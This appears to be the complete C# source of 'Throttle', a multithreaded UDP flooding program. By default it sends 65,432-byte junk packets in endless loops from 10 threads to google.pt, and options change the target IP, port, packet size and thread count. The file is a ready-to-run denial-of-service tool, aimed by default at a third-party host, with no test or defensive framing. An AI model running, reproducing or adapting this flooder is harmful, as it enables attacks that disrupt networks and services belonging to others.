using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using ScriptsLibV2.Extensions;

namespace Throttle
{
	internal class Program
	{
		private static readonly List<UdpClient> Clients = new List<UdpClient>();
		private const int WaitDuration = 10;

		static void Main(string[] args)
		{
			Console.Title = "Throttle";

			int packetSize = 65432;
			int threads = 10;
			IPAddress receiverIp = Dns.GetHostAddresses("google.pt")[0];
			short receiverPort = 100;
			bool wait = true;
			bool output = true;

			// Read settings from parameters
			for (int i = 0; i < args.Length; i++)
			{
				string arg = args[i].ToLower();
				if (arg.StartsWith("--"))
				{
					arg = arg.Substring(2);
					switch (arg)
					{
						case "packetsize":
							{
								try
								{
									packetSize = Convert.ToInt32(args[i + 1]);
								}
								catch
								{
									Console.WriteLine($"Invalid value for parameter --PacketSize: '{args[i + 1]}'");
								}
								break;
							}
						case "threads":
							{
								try
								{
									threads = Convert.ToInt32(args[i + 1]);
								}
								catch
								{
									Console.WriteLine($"Invalid value for parameter --Threads: '{args[i + 1]}'");
								}
								break;
							}
						case "nooutput":
							{
								output = false;
								break;
							}
						case "ip":
							{
								try
								{
									receiverIp = IPAddress.Parse(args[i + 1]);
								}
								catch
								{
									Console.WriteLine($"Invalid value for paremter --IP: '{args[i + 1]}'");
								}
								break;
							}
						case "port":
							{
								try
								{
									receiverPort = Convert.ToInt16(args[i + 1]);
								}
								catch
								{
									Console.WriteLine($"Invalid value for parameter --Port: '{args[i + 1]}'");
								}
								break;
							}
						case "nowait":
							{
								wait = false;
								break;
							}
					}
				}
			}

			// Create packet content
			StringBuilder sb = new StringBuilder();
			for (int i = 0; i < packetSize; i++)
			{
				sb.Append("Z");
			}
			byte[] data = sb.ToString().ToBytes();
			IPEndPoint receiver = new IPEndPoint(receiverIp, receiverPort);

			// Print config for 10 seconds
			if (wait)
			{
				for (int i = 0; i < WaitDuration; i++)
				{
					Console.WriteLine($"Packet Size: {packetSize}");
					Console.WriteLine($"Threads: {threads}");
					Console.WriteLine($"Receiver: {receiverIp}:{receiverPort}");
					Console.WriteLine($"Show Output: {(output ? "Yes" : "No")}");
					Console.WriteLine("");
					Console.WriteLine($"Waiting for {WaitDuration - i} seconds before continuing... (use --nowait to skip this)");
					Thread.Sleep(1000);
					Console.Clear();
				}
			}
			Console.WriteLine("Sending packets...");

			// Send packets
			for (int i = 0; i < threads; i++)
			{
				new Thread(() =>
				{
					UdpClient client = new UdpClient();
					Clients.Add(client);
					int index = Clients.IndexOf(client);

					if (output)
					{
						while (true)
						{
							client.Send(data, data.Length, receiver);
							Console.WriteLine($"[{index}] Sent {data.Length} bytes!");
						}
					}
					else
					{
						while (true)
						{
							client.Send(data, data.Length, receiver);
						}
					}
				}).Start();
			}

			// Lock thread
			Task.Delay(-1).Wait();
		}
	}
}
